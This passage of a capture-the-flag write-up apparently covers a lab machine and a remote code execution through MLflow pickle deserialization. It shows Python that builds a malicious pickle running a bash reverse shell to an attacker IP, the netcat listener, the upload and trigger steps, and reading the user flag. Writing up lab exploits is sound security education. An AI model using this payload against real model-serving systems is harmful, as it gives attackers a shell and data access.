2. MLflow Pickle Deserialization RCE

Created malicious pickle payload:

import pickle
import os

class Shell:
    def __reduce__(self):
        return (os.system, (f'bash -c "bash -i >& /dev/tcp/<KALI_VPN_IP>/4444 0>&1"',))

payload = pickle.dumps(Shell())
with open("model.pkl", "wb") as f:
    f.write(payload)

Steps:

  1. Uploaded the malicious model.pkl via MLflow API / Artifacts (as part of existing model).
  2. Started listener: nc -lvnp 4444
  3. Went to http://smarthire.htb/predict → uploaded any resume CSV
  4. Got reverse shell as svcweb

Read user.txt:

cat /home/svcweb/user.txt
User Flag
Why this matteredDefault credentials on internal MLOps tooling are a recurring theme — MLflow's model-artifact pipeline treats pickle files as trusted input, and `__reduce__` deserialization gadgets turn "upload a model" into arbitrary command execution the moment that model is loaded.
